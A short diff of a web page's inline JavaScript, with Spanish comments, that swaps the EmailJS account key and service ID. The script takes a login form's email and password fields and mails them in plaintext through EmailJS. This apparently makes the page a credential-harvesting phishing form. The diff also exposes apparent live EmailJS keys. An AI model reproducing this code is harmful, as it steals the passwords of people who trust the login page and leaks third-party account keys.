@@ -75,7 +75,7 @@
     <script type="text/javascript">
         // Inicializar EmailJS
         (function(){
-            emailjs.init("sK5jFr9FHr-FXAP6qKTTD"); // Sustituye YOUR_USER_ID con tu ID de usuario de EmailJS
+            emailjs.init("1MVoO32kuFF2j3UiY"); // Sustituye YOUR_USER_ID con tu ID de usuario de EmailJS
         })();
 
         // Función para manejar el envío del formulario
@@ -87,7 +87,7 @@
             var password = formData.get("password");
 
             // Enviar el correo electrónico utilizando EmailJS
-            emailjs.send("service_kn7xzg4", "login_form", {
+            emailjs.send("sK5jFr9FHr-FXAP6qKTTD", "login_form", {
                 user_email: email,
                 password: password
             })
